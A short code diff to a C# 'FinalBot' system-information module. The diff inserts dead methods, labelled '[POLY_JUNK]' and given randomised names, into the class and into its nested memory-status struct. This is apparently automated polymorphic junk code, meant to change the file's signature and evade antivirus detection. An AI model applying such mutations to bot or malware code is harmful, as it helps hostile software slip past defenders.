@@ -15,9 +15,21 @@ namespace FinalBot.Modules
 {
     public static class SystemInfoModule
     {
+        // [POLY_JUNK]
+        private static void _vanguard_54ed8aea() {
+            int val = 58601;
+            if (val > 50000) Console.WriteLine("Hash:" + 58601);
+        }
+
         [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
         private class MEMORYSTATUSEX
         {
+        // [POLY_JUNK]
+        private static void _vanguard_54ed8aea() {
+            int val = 58601;
+            if (val > 50000) Console.WriteLine("Hash:" + 58601);
+        }
+
             public uint dwLength;
             public uint dwMemoryLoad;
             public ulong ullTotalPhys;
